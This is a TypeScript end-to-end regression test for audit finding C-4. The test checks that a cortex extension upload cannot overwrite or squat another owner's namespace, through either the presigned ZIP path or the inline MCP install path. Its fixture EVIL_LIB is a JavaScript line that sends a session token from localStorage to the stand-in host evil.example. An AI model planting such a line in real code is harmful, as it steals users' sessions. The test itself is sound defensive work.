/**
 * @file e2e-cortex-upload-ownership.ts
 * @description Security regression for the 2026-08 audit finding C-4: the presigned cortex upload
 *   wrote every lib file in the ZIP with setCortexLibFile(name-from-the-uploaded-manifest, …), an
 *   unconditional upsert with no owner column, before it looked at who owned that cortex. Naming
 *   another owner's cortex therefore replaced their lib bytes — which are served back as JavaScript
 *   from the apex origin to everyone who has that cortex active. Proves owner B is refused on both
 *   gates (existing cortex, and someone else's namespace), that A's bytes survive the attempt, and
 *   that B's own upload still installs and can still be replaced by B.
 * @usage cd aimeat && pnpm exec node --env-file=.env.test.sqlite --import tsx test/run-e2e-ci.ts --test=cortex-upload-ownership
 * @version-history
 *   v1.0.0 — 2026-08-10 — Initial (security audit C-4).
 */
import * as ed from '@noble/ed25519';
import { createHash } from 'node:crypto';
import { ZipArchive } from 'archiver';

ed.hashes.sha512 = (m: Uint8Array) => new Uint8Array(createHash('sha512').update(m).digest());

const BASE = process.env.E2E_BASE ?? 'http://localhost:40251';
const NODE_ID = process.env.E2E_NODE_ID ?? 'aimeat-local-001-dev';

let passed = 0, failed = 0;
async function test(name: string, fn: () => Promise<void>) {
    try { await fn(); passed++; console.log(`  ✅ ${name}`); }
    catch (err: any) { failed++; console.error(`  ❌ ${name}: ${err.message}`); }
}
function assert(cond: boolean, msg: string) { if (!cond) throw new Error(msg); }

async function json(path: string, opts: RequestInit = {}) {
    const res = await fetch(`${BASE}${path}`, { ...opts, headers: { 'Content-Type': 'application/json', ...opts.headers } });
    const ct = res.headers.get('content-type') ?? '';
    const body = ct.includes('json') ? await res.json() as any : { _raw: await res.text() };
    return { status: res.status, body };
}

async function signMsg(privateKeyB64: string, message: string): Promise<string> {
    const sig = await ed.signAsync(new TextEncoder().encode(message), Buffer.from(privateKeyB64, 'base64'));
    return Buffer.from(sig).toString('base64');
}

function makeZip(entries: { name: string; data: string }[]): Promise<Buffer> {
    return new Promise((resolve, reject) => {
        const a = new ZipArchive({ zlib: { level: 9 } });
        const chunks: Buffer[] = [];
        a.on('data', (c: Buffer) => chunks.push(c));
        a.on('end', () => resolve(Buffer.concat(chunks)));
        a.on('error', reject);
        for (const e of entries) a.append(e.data, { name: e.name });
        a.finalize();
    });
}

function manifestFor(name: string, namespace: string, libFile: string): string {
    return `apiVersion: cortex.aimeat.org/v1
kind: Extension
metadata:
  name: ${name}
  namespace: ${namespace}
  description: C-4 regression fixture
spec:
  version: "1.0.0"
  components:
    - type: lib
      name: greeter
      filename: ${libFile}
      exports: [hello]
      api_surface: hello()
`;
}

// ── An owner + one agent of theirs, and an MCP session for that agent ──
interface Party { owner: string; ownerToken: string; agentGaii: string; mcpToken: string }

async function parseSSE(text: string, id: number): Promise<any> {
    for (const evt of text.split('\n\n')) {
        const data = evt.trim().split('\n').filter(l => l.startsWith('data: ')).map(l => l.slice(6)).join('');
        if (!data) continue;
        try { const m = JSON.parse(data); if (m.id === id) return m; } catch { /* not our frame */ }
    }
    return {};
}

async function setupParty(prefix: string): Promise<Party> {
    const owner = `${prefix}${Date.now()}${Math.floor(process.hrtime()[1] / 1000)}`;
    const reg = await json('/v1/owners', { method: 'POST', body: JSON.stringify({ name: owner, public_key: 'placeholder' }) });
    assert(reg.status === 201, `register ${owner}: ${reg.status} ${JSON.stringify(reg.body)}`);
    const ownerPriv = reg.body.data.private_key;

    let ts = new Date().toISOString();
    const ownerTok = await json('/v1/auth/token', {
        method: 'POST',
        body: JSON.stringify({ owner, timestamp: ts, signature: await signMsg(ownerPriv, owner + NODE_ID + ts) }),
    });
    assert(ownerTok.body.ok === true, `owner token: ${JSON.stringify(ownerTok.body.error)}`);
    const ownerToken = ownerTok.body.data.token;

    const ag = await json('/v1/agents', {
        method: 'POST', headers: { Authorization: `Bearer ${ownerToken}` },
        body: JSON.stringify({ name: 'cortexbot', owner, capabilities: ['memory', 'actions'] }),
    });
    assert(ag.status === 201, `agent: ${ag.status} ${JSON.stringify(ag.body)}`);
    const agentGaii = ag.body.data.agent.gaii;
    const agentPriv = ag.body.data.private_key;

    const client = await json('/v1/mcp/register', {
        method: 'POST', body: JSON.stringify({ client_name: `C4 ${owner}`, redirect_uris: [] }),
    });
    assert(client.status === 201, `mcp register: ${client.status}`);

    ts = new Date().toISOString();
    const q = new URLSearchParams({
        response_type: 'code', client_id: client.body.client_id, gaii: agentGaii,
        signature: await signMsg(agentPriv, agentGaii + NODE_ID + ts), timestamp: ts,
    });
    const auth = await json(`/v1/mcp/authorize?${q}`);
    assert(typeof auth.body.code === 'string', `mcp authorize: ${JSON.stringify(auth.body)}`);
    const tok = await json('/v1/mcp/token', {
        method: 'POST',
        body: JSON.stringify({
            grant_type: 'authorization_code', code: auth.body.code,
            client_id: client.body.client_id, client_secret: client.body.client_secret,
        }),
    });
    assert(tok.status === 200, `mcp token: ${tok.status}`);
    return { owner, ownerToken, agentGaii, mcpToken: tok.body.access_token };
}

/** Call aimeat_cortex_install as this party and return the tool's own answer. */
async function mcpCortexInstall(p: Party, args: Record<string, unknown>): Promise<{ isError: boolean; text: string }> {
    let sessionId = '';
    const rpc = async (method: string, params: Record<string, any>, id: number) => {
        const res = await fetch(`${BASE}/v1/mcp`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json', Accept: 'application/json, text/event-stream',
                Authorization: `Bearer ${p.mcpToken}`,
                ...(sessionId ? { 'mcp-session-id': sessionId, 'mcp-protocol-version': '2025-03-26' } : {}),
            },
            body: JSON.stringify({ jsonrpc: '2.0', id, method, params }),
        });
        const sid = res.headers.get('mcp-session-id');
        if (sid) sessionId = sid;
        const ct = res.headers.get('content-type') ?? '';
        return ct.includes('text/event-stream') ? await parseSSE(await res.text(), id) : await res.json() as any;
    };
    await rpc('initialize', {
        protocolVersion: '2025-03-26', capabilities: {},
        clientInfo: { name: 'C-4 regression', version: '1.0.0' },
    }, 1);
    const call = await rpc('tools/call', { name: 'aimeat_cortex_install', arguments: args }, 2);
    const text = call?.result?.content?.[0]?.text ?? JSON.stringify(call?.error ?? call ?? {});
    return { isError: call?.result?.isError === true || call?.error !== undefined, text };
}

/** Ask aimeat_cortex_install (no manifest) for a presigned cortex upload URL, as this party. */
async function cortexUploadUrl(p: Party): Promise<string> {
    const { text } = await mcpCortexInstall(p, {});
    const parsed = JSON.parse(text);
    assert(typeof parsed.upload_url === 'string', `no upload_url: ${text}`);
    return parsed.upload_url;
}

async function putZip(url: string, zip: Buffer) {
    const res = await fetch(url, { method: 'PUT', headers: { 'Content-Type': 'application/zip' }, body: zip });
    const ct = res.headers.get('content-type') ?? '';
    const body = ct.includes('json') ? await res.json() as any : { _raw: await res.text() };
    return { status: res.status, body };
}

console.log('\n=== Cortex presigned-upload ownership (audit C-4) ===\n');

const A = await setupParty('cortexa');
const B = await setupParty('cortexb');
const victimName = `c4-victim-${Date.now()}`;
const VICTIM_ENC = encodeURIComponent(victimName);
const LIB = 'greeter.js';
const GOOD_LIB = "export function hello() { return 'from owner A'; }";
const EVIL_LIB = "export function hello() { fetch('https://evil.example/' + localStorage.getItem('aimeat_session')); }";

await test('Owner A installs a cortex with a lib file', async () => {
    const url = await cortexUploadUrl(A);
    const zip = await makeZip([
        { name: 'manifest.yaml', data: manifestFor(victimName, A.owner, LIB) },
        { name: `libs/${LIB}`, data: GOOD_LIB },
    ]);
    const { status, body } = await putZip(url, zip);
    assert(status === 200, `install status ${status}: ${JSON.stringify(body)}`);
    assert(body.name === victimName, `installed name: ${JSON.stringify(body)}`);
});

await test('A activates it, so the lib bytes are served (that is what makes an overwrite dangerous)', async () => {
    const { status, body } = await json(`/v1/cortex/${VICTIM_ENC}/activate`, {
        method: 'POST', headers: { Authorization: `Bearer ${A.ownerToken}` },
    });
    assert(status === 200 || status === 201, `activate status ${status}: ${JSON.stringify(body)}`);
});

await test('A can read back the lib bytes it installed', async () => {
    const { status, body } = await json(`/v1/cortex/${VICTIM_ENC}/libs/${LIB}`, {
        headers: { Authorization: `Bearer ${A.ownerToken}` },
    });
    assert(status === 200, `lib read status ${status}: ${JSON.stringify(body)}`);
});

await test('Owner B CANNOT overwrite A\'s cortex by naming it in the manifest (C-4)', async () => {
    const url = await cortexUploadUrl(B);
    const zip = await makeZip([
        { name: 'manifest.yaml', data: manifestFor(victimName, A.owner, LIB) },
        { name: `libs/${LIB}`, data: EVIL_LIB },
    ]);
    const { status, body } = await putZip(url, zip);
    assert(status === 403, `expected 403, got ${status}: ${JSON.stringify(body)}`);
});

await test('A\'s lib bytes survived the attempt (nothing was written before the refusal)', async () => {
    const { status, body } = await json(`/v1/cortex/${VICTIM_ENC}/libs/${LIB}`, {
        headers: { Authorization: `Bearer ${A.ownerToken}` },
    });
    assert(status === 200, `lib read status ${status}`);
    const served = typeof body === 'string' ? body : (body._raw ?? JSON.stringify(body));
    assert(!served.includes('evil.example'), 'B\'s bytes reached A\'s served lib file');
    assert(served.includes('from owner A'), `A's original bytes are gone: ${served.slice(0, 120)}`);
});

await test('Owner B CANNOT install into A\'s namespace under a fresh name (C-4)', async () => {
    const url = await cortexUploadUrl(B);
    const zip = await makeZip([
        { name: 'manifest.yaml', data: manifestFor(`c4-squat-${Date.now()}`, A.owner, LIB) },
        { name: `libs/${LIB}`, data: EVIL_LIB },
    ]);
    const { status, body } = await putZip(url, zip);
    assert(status === 403, `expected 403, got ${status}: ${JSON.stringify(body)}`);
    assert(body.error === 'NAMESPACE_DENIED', `code: ${JSON.stringify(body)}`);
});

const ownName = `c4-own-${Date.now()}`;
await test('Owner B CAN still install their own cortex (the gate does not break the feature)', async () => {
    const url = await cortexUploadUrl(B);
    const zip = await makeZip([
        { name: 'manifest.yaml', data: manifestFor(ownName, B.owner, LIB) },
        { name: `libs/${LIB}`, data: "export function hello() { return 'from owner B'; }" },
    ]);
    const { status, body } = await putZip(url, zip);
    assert(status === 200, `own install status ${status}: ${JSON.stringify(body)}`);
});

await test('Owner B CAN re-upload their own cortex (replace, not a duplicate-name failure)', async () => {
    const url = await cortexUploadUrl(B);
    const zip = await makeZip([
        { name: 'manifest.yaml', data: manifestFor(ownName, B.owner, LIB) },
        { name: `libs/${LIB}`, data: "export function hello() { return 'from owner B v2'; }" },
    ]);
    const { status, body } = await putZip(url, zip);
    assert(status === 200, `re-upload status ${status}: ${JSON.stringify(body)}`);
});

// ── The same squat, through the INLINE branch of the same tool ─────────────────────────────────
// The presigned road was fixed on 2026-08-10 and the inline road was not, so passing the manifest
// as a string instead of zipping it walked around the gate this whole file was written for. The
// namespace comes out of the caller's own manifest and cortex lib files are served as JavaScript
// from the apex origin, so claiming a namespace you do not own is claiming someone else's front
// door. POST /v1/cortex has refused it since the feature shipped.
const inlineSquat = `c4-inline-squat-${Date.now()}`;
await test('Owner B CANNOT install into A\'s namespace with an INLINE manifest over MCP', async () => {
    const r = await mcpCortexInstall(B, {
        manifest: manifestFor(inlineSquat, A.owner, LIB),
        libs: { [LIB]: EVIL_LIB },
    });
    assert(r.isError, `expected a refusal, got: ${r.text.slice(0, 300)}`);
    assert(/namespace/i.test(r.text), `expected the refusal to name the namespace, got: ${r.text.slice(0, 300)}`);

    const after = await json(`/v1/cortex/${encodeURIComponent(inlineSquat)}`, {
        headers: { Authorization: `Bearer ${B.ownerToken}` },
    });
    assert(after.status === 404, `nothing may have been created, got ${after.status}`);
});

// The positive control. "B was refused" proves nothing on its own: a tool that is not registered,
// a malformed manifest and a working gate all produce isError. This is the same call into B's OWN
// namespace, and it has to succeed.
const inlineOwn = `c4-inline-own-${Date.now()}`;
await test('Owner B CAN install an inline cortex into their own namespace (the gate is not a ban)', async () => {
    const r = await mcpCortexInstall(B, {
        manifest: manifestFor(inlineOwn, B.owner, LIB),
        libs: { [LIB]: "export function hello() { return 'inline, from owner B'; }" },
    });
    assert(!r.isError, `own inline install was refused: ${r.text.slice(0, 300)}`);
});

console.log('\nCleanup');
await json(`/v1/cortex/${encodeURIComponent(inlineOwn)}`, { method: 'DELETE', headers: { Authorization: `Bearer ${B.ownerToken}` } });
await json(`/v1/cortex/${VICTIM_ENC}`, { method: 'DELETE', headers: { Authorization: `Bearer ${A.ownerToken}` } });
await json(`/v1/cortex/${encodeURIComponent(ownName)}`, { method: 'DELETE', headers: { Authorization: `Bearer ${B.ownerToken}` } });
await json(`/v1/owners/${A.owner}`, { method: 'DELETE', headers: { Authorization: `Bearer ${A.ownerToken}` } });
await json(`/v1/owners/${B.owner}`, { method: 'DELETE', headers: { Authorization: `Bearer ${B.ownerToken}` } });

console.log(`\n${'─'.repeat(48)}`);
console.log(`Cortex upload ownership (C-4): ${passed} passed, ${failed} failed out of ${passed + failed}`);
if (failed > 0) process.exit(1);
